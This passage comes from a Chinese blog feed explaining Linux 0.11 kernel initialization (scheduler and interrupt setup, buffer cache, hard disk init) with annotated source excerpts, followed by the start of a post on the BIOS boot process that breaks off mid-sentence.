   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>ltr</code>是给<code>tr</code>寄存器赋值，以告诉 CPU 任务状态段 TSS 在内存中的位置；<code>lldt</code>是给<code>ldt</code>寄存器赋值，以告诉 CPU 局部描述符 LDT 在内存中的位置。 (同之前的<code>lidt</code>和<code>lght</code>)</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648450971773213/c754e3c906a5e60a32efc51cb601fcbd39a7b8e3.png" alt="640 (3)"></p><p>接着往下看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sched_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    outb_p(<span class="number">0x36</span>,<span class="number">0x43</span>);      <span class="comment">/* binary, mode 3, LSB/MSB, ch 0 */</span></span><br><span class="line">    outb_p(LATCH &amp; <span class="number">0xff</span> , <span class="number">0x40</span>);    <span class="comment">/* LSB */</span></span><br><span class="line">    outb(LATCH &gt;&gt; <span class="number">8</span> , <span class="number">0x40</span>);    <span class="comment">/* MSB */</span></span><br><span class="line">    set_intr_gate(<span class="number">0x20</span>,&amp;timer_interrupt);</span><br><span class="line">    outb(inb_p(<span class="number">0x21</span>)&amp;~<span class="number">0x01</span>,<span class="number">0x21</span>);</span><br><span class="line">    set_system_gate(<span class="number">0x80</span>,&amp;system_call);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>四行端口读写代码，交互的外设是一个可编程定时器的芯片(LATCH)，这四行代码就开启了这个定时器，之后这个定时器变会<strong>持续的、以一定频率的向 CPU 发出中断信号</strong>。</p><p>两行设置中断代码，第一个是<strong>时钟中断</strong>，中断号为 0x20，中断程序为 timer_interrupt，每次定时器向 CPU 发出中断，都会执行这个函数。第二个是<strong>系统调用</strong>，中断号为 0x80，灰常关键，所有用户态程序想要调用内核提供的方法，都需要基于这个系统调用来进行。</p><hr><p>来总结一下现在的中断都设置了哪些：</p><table><thead><tr><th>中断号</th><th>中断处理函数</th></tr></thead><tbody><tr><td>0 ~ 0x10</td><td>trap_init 里设置的一堆</td></tr><tr><td>0x20</td><td>timer_interrupt</td></tr><tr><td>0x21</td><td>keyboard_interrupt</td></tr><tr><td>0x80</td><td>system_call</td></tr></tbody></table><p>0 ~ 0x10：一些基本的中断，比如除零异常等 (trap_init)</p><p>0x20：时钟中断</p><p>0x21：处理键盘输入，使得键盘能用 (tty_init)</p><p>0x80：系统调用</p><hr><p><strong>总结一下 shed_init() 干的事：</strong></p><ul><li>在全局描述符表 gdt 里写入了两个结构 TSS 和 LDT，作为未来进程 0 的任务状态段和局部描述符表信息。</li><li>初始化了一个 task_struct 结构数组(task[0]=init_task.init,task[1~63]=NULL)， 作为未来进程 0 的信息。</li><li>和一个可编程定时器芯片进行交互，使其持续向 CPU 发出中断信号；设置了时间中断 0x20 和系统调用 0x80，一个是进程调度的起点，一个是用户程序调用操作系统的桥梁。</li></ul><h3 id="buffer-init-buffer-memory-end"><a href="#buffer-init-buffer-memory-end" class="headerlink" title="buffer_init(buffer_memory_end)"></a>buffer_init(buffer_memory_end)</h3><p>首先要注意到的是，这个函数一开始就传入了一个参数，这个参数是什么呢？是 main 函数最开始计算的三个变量的其中一个。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648556191205553/1d8daf264007aed295e7660dbfaa8f92f18bfee5.png" alt="640"></p><p>而之前我们又用 <code>mem_init</code> 设置好了<strong>主内存</strong>的管理结构 <code>mam_map</code>。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648556313827348/6f87e9989e63b9e4439b63967df034230bf26555.png" alt="640 (1)"></p><p>而这个函数就是<strong>要把缓冲区也初始化管理起来</strong>。</p><p>看看源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> end;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">start_buffer</span> =</span> (struct buffer_head *) &amp;end;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buffer_init</span><span class="params">(<span class="keyword">long</span> buffer_end)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">h</span> =</span> start_buffer;</span><br><span class="line">    <span class="keyword">void</span> * b = (<span class="keyword">void</span> *) buffer_end;</span><br><span class="line">    <span class="keyword">while</span> ( (b -= <span class="number">1024</span>) &gt;= ((<span class="keyword">void</span> *) (h+<span class="number">1</span>)) ) &#123;</span><br><span class="line">        h-&gt;b_dev = <span class="number">0</span>;</span><br><span class="line">        h-&gt;b_dirt = <span class="number">0</span>;</span><br><span class="line">        h-&gt;b_count = <span class="number">0</span>;</span><br><span class="line">        h-&gt;b_lock = <span class="number">0</span>;</span><br><span class="line">        h-&gt;b_uptodate = <span class="number">0</span>;</span><br><span class="line">        h-&gt;b_wait = <span class="literal">NULL</span>;</span><br><span class="line">        h-&gt;b_next = <span class="literal">NULL</span>;</span><br><span class="line">        h-&gt;b_prev = <span class="literal">NULL</span>;</span><br><span class="line">        h-&gt;b_data = (<span class="keyword">char</span> *) b;</span><br><span class="line">        h-&gt;b_prev_free = h<span class="number">-1</span>;</span><br><span class="line">        h-&gt;b_next_free = h+<span class="number">1</span>;</span><br><span class="line">        h++;</span><br><span class="line">    &#125;</span><br><span class="line">    h--;</span><br><span class="line">    free_list = start_buffer;</span><br><span class="line">    free_list-&gt;b_prev_free = h;</span><br><span class="line">    h-&gt;b_next_free = free_list;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">307</span>;i++)</span><br><span class="line">        hash_table[i]=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先看第一行，将一个外部变量 end 的地址赋值给缓冲区开始位置 <code>start_buffer</code>。这个 end 变量并不是操作系统写好的，而是由链接器 ld 在链接整个程序时设置的一个外部变量，是已经计算好了的内核代码的末尾地址。</p><p>用一张图表示就是：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648557040502378/c8f037c560e25607fb531ce81d5b727b75e1216c.png" alt="640 (2)"></p><p>可以说是靠 end 这个值划分了内核程序和缓冲区。</p><p>接着往下看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buffer_init</span><span class="params">(<span class="keyword">long</span> buffer_end)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> * <span class="title">h</span> =</span> start_buffer;</span><br><span class="line">    <span class="keyword">void</span> * b = (<span class="keyword">void</span> *) buffer_end;</span><br><span class="line">    <span class="keyword">while</span> ( (b -= <span class="number">1024</span>) &gt;= ((<span class="keyword">void</span> *) (h+<span class="number">1</span>)) ) &#123;</span><br><span class="line">        ...</span><br><span class="line">        h-&gt;b_data = (<span class="keyword">char</span> *) b;</span><br><span class="line">        h-&gt;b_prev_free = h<span class="number">-1</span>;</span><br><span class="line">        h-&gt;b_next_free = h+<span class="number">1</span>;</span><br><span class="line">        h++;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对两个变量进行操作</p><p>第一个变量是 <strong>buffer_head 结构的 h</strong>，代表缓冲头，指针值是 start_buffer，也就是 end 的地址。</p><p>第二个变量是 <strong>b</strong>，指针值是 buffer_end，代表缓冲区的结尾。</p><p>b 每循环一次 <code>-1024</code>，缓冲头 h + 1。所以 b 代表缓冲块，h 代表缓冲头，一个从上往下，一个从下往上。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648557983103126/b78c31d8d23020ccf5a4e0848ed8374dd308d75f.png" alt="640 (3)"></p><p>而且 h 被赋上了各种属性，其中 <code>b_data</code>属性就被赋值成了缓冲块 b。</p><p>两个空闲 buffer 指针：<strong>b_prev_free</strong> 表示前一个空闲缓冲头，<strong>b_next_free</strong> 表示后一个空闲缓冲头。可以说缓冲头由双向链表链成。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648558966056890/46605ccd15e99d8186eab91b90dbc445b20edb44.png" alt="640"></p><p>接着往下看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buffer_init</span><span class="params">(<span class="keyword">long</span> buffer_end)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    free_list = start_buffer;</span><br><span class="line">    free_list-&gt;b_prev_free = h;</span><br><span class="line">    h-&gt;b_next_free = free_list;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将第一个缓冲头赋给 free_list，并将 free_list(第一个缓冲头) 的 b_prev_free 赋值为 h(最后一个缓冲头)，并将 h(最后一个缓冲头) 的 b_next_free 赋值为 free_list(第一个缓冲头)，说人话就是最后一个缓冲头的下一个缓冲头是第一个缓冲头，第一个缓冲头的上一个缓冲头是最后一个缓冲头。用图表示就是：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648559941715857/ed6e25398debf7d27363d159c1e6a57ac2cd7858.png" alt="640 (1)"></p><p>free_list 可以在这个双向链表中遍历任何一个缓冲头，然后通过特定的缓冲头又能对应到特定的缓冲块。管理系统就这样建成了。</p><p>接着往下看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buffer_init</span><span class="params">(<span class="keyword">long</span> buffer_end)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">307</span>;i++)</span><br><span class="line">        hash_table[i]=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 <code>hash_table</code> 数组是干啥的呢？</p><p> 我们知道这个 buffer.c 是在 fs 文件夹里的，fs 代表着文件系统。当读取块设备的数据时，会先读到缓冲区中，如果缓冲区已经有了，就不会再从块设备里读取了，而是直接从缓冲区取走。</p><p>那系统怎么知道缓冲区已经有了要读取的块设备中的数据呢？</p><p>每一次都遍历双向链表效率太低，所以就需要这个 hash_table 的结构快速查找。</p><p>现在只是初始化了这个 hash_table 结构。</p><hr><p>简单补充一下 hash_table 的调用过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _hashfn(dev,block) (((unsigned)(dev^block))%307)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> hash(dev,block) hash_table[_hashfn(dev,block)]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 搜索合适的缓冲块 </span></span><br><span class="line"><span class="function">struct buffer_head * <span class="title">getblk</span><span class="params">(<span class="keyword">int</span> dev,<span class="keyword">int</span> block)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">buffer_head</span> <span class="title">bh</span> =</span> get_hash_table(dev,block)；</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct buffer_head * <span class="title">get_hash_table</span><span class="params">(<span class="keyword">int</span> dev, <span class="keyword">int</span> block)</span> </span>&#123;</span><br><span class="line">    ...    </span><br><span class="line">    find_buffer(dev,block);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> struct buffer_head * <span class="title">find_buffer</span><span class="params">(<span class="keyword">int</span> dev, <span class="keyword">int</span> block)</span> </span>&#123; </span><br><span class="line">    ...     </span><br><span class="line">    hash(dev,block);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到最关键的是 <strong>(dev^block))%307</strong>，hash_table下标的寻找方式。即(设备号^逻辑块号) % 307</p><p>利用了数据结构哈希表来实现</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt-2/1648604342735727/3db337914d1569bb2c8985ae8377880c98713caa.png" alt="640"></p><hr><p><strong>总结一下buffer_init()干的事：初始化缓冲区管理</strong></p><h3 id="hd-init"><a href="#hd-init" class="headerlink" title="hd_init()"></a>hd_init()</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//struct blk_dev_struct &#123;</span></span><br><span class="line"><span class="comment">//    void (*request_fn)(void);</span></span><br><span class="line"><span class="comment">//    struct request * current_request;</span></span><br><span class="line"><span class="comment">//&#125;;</span></span><br><span class="line"><span class="comment">//extern struct blk_dev_struct blk_dev[NR_BLK_DEV];</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hd_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    blk_dev[<span class="number">3</span>].request_fn = do_hd_request;</span><br><span class="line">    set_intr_gate(<span class="number">0x2E</span>,&amp;hd_interrupt);<span class="comment">//设置中断描述符</span></span><br><span class="line">    outb_p(inb_p(<span class="number">0x21</span>)&amp;<span class="number">0xfb</span>,<span class="number">0x21</span>);<span class="comment">//和硬件交互</span></span><br><span class="line">    outb(inb_p(<span class="number">0xA1</span>)&amp;<span class="number">0xbf</span>,<span class="number">0xA1</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>硬盘初始化</p><p>硬件设备的初始化大体都是：</p><ol><li>往某些 IO 端口上读写一些数据，表示开启它</li><li>然后向中断向量表中添加一个中断，使得 CPU 能够响应这个硬件设备的动作</li><li>初始化一些数据结构来管理</li></ol><p>先看第一行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hd_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    blk_dev[<span class="number">3</span>].request_fn = do_hd_request;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 blk_dev 数组的索引 3 位置处的块设备管理结构 <strong>blk_dev_struct</strong> 的 <strong>request_fn</strong> 赋值为了 <strong>do_hd_request</strong></p><p>Linux 0.11 内核用了一个 <strong>blk_dev[]</strong> 来进行管理，每一个索引表示一个块设备。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">blk_dev_struct</span> <span class="title">blk_dev</span>[<span class="title">NR_BLK_DEV</span>] =</span> &#123; （kernel/blk_drv/ll_rw_blk.c）</span><br><span class="line">    &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;,     <span class="comment">/* no_dev */</span></span><br><span class="line">    &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;,     <span class="comment">/* dev mem */</span></span><br><span class="line">    &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;,     <span class="comment">/* dev fd */</span></span><br><span class="line">    &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;,     <span class="comment">/* dev hd */</span></span><br><span class="line">    &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;,     <span class="comment">/* dev ttyx */</span></span><br><span class="line">    &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;,     <span class="comment">/* dev tty */</span></span><br><span class="line">    &#123; <span class="literal">NULL</span>, <span class="literal">NULL</span> &#125;      <span class="comment">/* dev lp */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到索引为 3 的地方表示 hd。</p><p>每个块设备执行读写请求都有自己的函数实现，在上面看来就是一个统一函数 <strong>request_fn</strong>，对于硬盘来说，实现的就是<code>do_hd_request</code>函数。</p><p>再看第二行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hd_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    set_intr_gate(<span class="number">0x2E</span>,&amp;hd_interrupt);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置中断，中断号为 <code>0x2E</code>，中断程序为<code>hd_interrupt</code>，也就是执行 <code>do_hd_request()</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_hd_interrupt:</span><br><span class="line">    ...</span><br><span class="line">    xchgl _do_hd,%edx</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 如果是读盘操作，这个 do_hd 是 read_intr</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">read_intr</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    do_hd_request();</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>再来总结一下中断</p><table><thead><tr><th align="left">中断号</th><th align="left">中断处理函数</th></tr></thead><tbody><tr><td align="left"><code>0 ~ 0x10</code></td><td align="left"><code>trap_init</code> 里设置的一堆</td></tr><tr><td align="left"><code>0x20</code></td><td align="left"><code>timer_interrupt</code></td></tr><tr><td align="left"><code>0x21</code></td><td align="left"><code>keyboard_interrupt</code></td></tr><tr><td align="left"><code>0x2E</code></td><td align="left"><code>hd_interrupt</code></td></tr><tr><td align="left"><code>0x80</code></td><td align="left"><code>system_call</code></td></tr></tbody></table><p>0~0x10：17个基本中断，如除零异常，trap_init 初始化设置。</p><p>0x20：时钟中断。开启定时器，sched_init 初始化设置。</p><p>0x21：键盘中断，此时按键盘开始起效，con_init 初始化设置。</p><p>0x2E：硬盘中断，读写硬盘完成后触发中断，d_init 初始化设置。</p><p>0x80：系统调用中断，sched_init 初始化设置。</p><p><strong>可以发现，让操作系统工作的唯一方式，就是触发中断。</strong></p><hr><p>接着往下看：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hd_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    outb_p(inb_p(<span class="number">0x21</span>)&amp;<span class="number">0xfb</span>,<span class="number">0x21</span>);</span><br><span class="line">    outb(inb_p(<span class="number">0xA1</span>)&amp;<span class="number">0xbf</span>,<span class="number">0xA1</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>往几个 IO 端口上读写，目的是<strong>允许硬盘控制器发送中断请求信号</strong>。</p><p><strong>总结一下 hd_init() 干的事：给硬盘赋值读写请求函数，设置了新的中断号和中断程序，和 IO 设备交互，发送中断。</strong></p><hr><p>读硬盘最底层的操作流程是怎样的呢？之前 tty_init 的时候也讲过：</p><p>硬盘的端口表：</p><table><thead><tr><th align="left">端口</th><th align="left">读</th><th align="left">写</th></tr></thead><tbody><tr><td align="left">0x1F0</td><td align="left">数据寄存器</td><td align="left">数据寄存器</td></tr><tr><td align="left">0x1F1</td><td align="left">错误寄存器</td><td align="left">特征寄存器</td></tr><tr><td align="left">0x1F2</td><td align="left">扇区计数寄存器</td><td align="left">扇区计数寄存器</td></tr><tr><td align="left">0x1F3</td><td align="left">扇区号寄存器或 LBA 块地址 0~7</td><td align="left">扇区号或 LBA 块地址 0~7</td></tr><tr><td align="left">0x1F4</td><td align="left">磁道数低 8 位或 LBA 块地址 8~15</td><td align="left">磁道数低 8 位或 LBA 块地址 8~15</td></tr><tr><td align="left">0x1F5</td><td align="left">磁道数高 8 位或 LBA 块地址 16~23</td><td align="left">磁道数高 8 位或 LBA 块地址 16~23</td></tr><tr><td align="left">0x1F6</td><td align="left">驱动器/磁头或 LBA 块地址 24~27</td><td align="left">驱动器/磁头或 LBA 块地址 24~27</td></tr><tr><td align="left">0x1F7</td><td align="left">命令寄存器或状态寄存器</td><td align="left">命令寄存器</td></tr></tbody></table><p>读硬盘时，会先往除<code>0x1F0</code>端口的其他端口上写数据，告诉硬盘要读的是哪个扇区，读多少。然后再从<code>0x1F0</code>这个端口读数据。</p><p>具体过程：</p><ol><li>在 0x1F2 写入要读取的扇区数</li><li>在 0x1F3 ~ 0x1F6 这四个端口写入计算好的起始 LBA 地址</li><li>在 0x1F7 处写入读命令的指令号</li><li>不断检测 0x1F7 （此时已成为状态寄存器的含义）的忙位</li><li>如果第四步骤为不忙，则开始不断从 0x1F0 处读取数据到内存指定位置，直到读完</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hd_out</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> drive,<span class="keyword">unsigned</span> <span class="keyword">int</span> nsect,<span class="keyword">unsigned</span> <span class="keyword">int</span> sect,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">unsigned</span> <span class="keyword">int</span> head,<span class="keyword">unsigned</span> <span class="keyword">int</span> cyl,<span class="keyword">unsigned</span> <span class="keyword">int</span> cmd,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">void</span> (*intr_addr)(<span class="keyword">void</span>))</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    do_hd = intr_addr;</span><br><span class="line">    outb_p(hd_info[drive].ctl,HD_CMD);</span><br><span class="line">    port = <span class="number">0x1f0</span>;</span><br><span class="line">    outb_p(hd_info[drive].wpcom&gt;&gt;<span class="number">2</span>,++port);</span><br><span class="line">    outb_p(nsect,++port);</span><br><span class="line">    outb_p(sect,++port);</span><br><span class="line">    outb_p(cyl,++port);</span><br><span class="line">    outb_p(cyl&gt;&gt;<span class="number">8</span>,++port);</span><br><span class="line">    outb_p(<span class="number">0xA0</span>|(drive&lt;&lt;<span class="number">4</span>)|head,++port);</span><br><span class="line">    outb(cmd,++port);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>outb_p</code>转换成汇编就是<code>out</code>指令，往指定的硬盘 IO 端口写数据。</p><p>当我们在用户层写 read/write 函数，即便是经过系统调用、文件系统、缓冲区管理等等过程，但只要是读写硬盘，最终都要调用到这个最底层的函数。</p><hr><h3 id="floppy-init"><a href="#floppy-init" class="headerlink" title="floppy_init()"></a><strong>floppy_init()</strong></h3><p>软盘初始化，现在基本不常用了，就不多说了。</p><h3 id="sti"><a href="#sti" class="headerlink" title="sti()"></a>sti()</h3><p>sti 对应一个同名的汇编指令 sti()，表示<strong>允许中断</strong>，在这之后，所有的中断开始生效。本质上是将 eflags 寄存器里的中断允许标志位 IF 位置 1。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统之进入内核前的准备</title>
      <link href="/2022/03/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E8%BF%9B%E5%85%A5%E5%86%85%E6%A0%B8%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87/"/>
      <url>/2022/03/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%8B%E8%BF%9B%E5%85%A5%E5%86%85%E6%A0%B8%E5%89%8D%E7%9A%84%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<p> 本来是想着入门内核的，然后看着看着就看到了这篇文章，觉得学到很多，反正以后操作系统也要接触，就当初探了一下，写个学习笔记记录一下学到的东西。(果然只有自己再总结加工才能真正吸收xs)</p><h2 id="开机会发生什么？"><a href="#开机会发生什么？" class="headerlink" title="开机会发生什么？"></a>开机会发生什么？</h2><p>当按下开机键后究竟发生了什么呢？</p><p>网上搜出来大体是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BIOS 按照“启动顺序”，把控制权转交给排在第一位的存储设备：硬盘。然后在硬盘里寻找主引导记录的分区，这个分区告诉电脑操作系统在哪里，并把操作系统被加载到内存中，然后你就能看到经典的启动界面了，这个开机过程也就完成了。</span><br></pre></td></tr></table></figure><p>现在就来具体讲讲(也没有很具体)整个过程：</p><p>先放一张实模式下的内存分布图：(不用管实模式是什么)</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/czxt/1647006188975711/3cd5283d38740727ae12cced09fa39237a762818.png" alt="未命名图片"></p><p>可以简单理解为计算机刚开机的时候就只有 1M 的内存可用，可以看到 BIOS 被映射到了 0xC0000 - 0xFFFFF 的位置。</p><p>众所周知，CPU 会把内存中的指令放入 PC 寄存器 并执行。BIOS 程序的入口地址规定是 0xFFFF0，开机的一瞬间，CPU 的 PC 寄存器会被强制初始化为 0xFFFF0；说得再具体一点就是：CPU 将 段寄存器CS 初始化为 0xF000，将偏移地址寄存器 IP 初始化为 0xFFF0，再根据最终地址的计算规则，将段寄存器左移 4 位，再加上偏移地址，得到的最终的物理地址就是 0xFFFF0。这也就是为啥开机最先执行的是 BIOS 程序了。</p><p>上面说了 BIOS 被映射到了 0xC0000 - 0xFFFFF 的位置，而开机 CPU 跳转的地方是 0xFFFF0，只剩下 16 个字节可以写，这有啥用呢？很显然根本干不了啥，所以 0xFFFF0 这个入口地址处存的是个跳转指令，跳到一个更大范围的空间去执行代码。</p><p>0xFFFF0 处存储的机器指令，翻译成汇编语言就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp far f000:e05b</span><br></pre></td></tr></table></figure><p>意思就是跳转到 0xfe05b 处执行。</p><p>也就是说 0xfe05b 的代码，才是 BIOS 程序真正要执行的代码，这一段代码会执行很多事情，比如检测/初始化……但最重要的还是最后执行的<strong>加载启动区。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这里浅说一下 BIOS 是如何找到启动区的：</span><br><span class="line"></span><br><span class="line">它会按顺序读取启动盘(磁盘)位于 &#96;0盘0道1扁区&#96; 的内容，并判断末尾的两个字节是否分别是 &#96;0x55&#96; 和 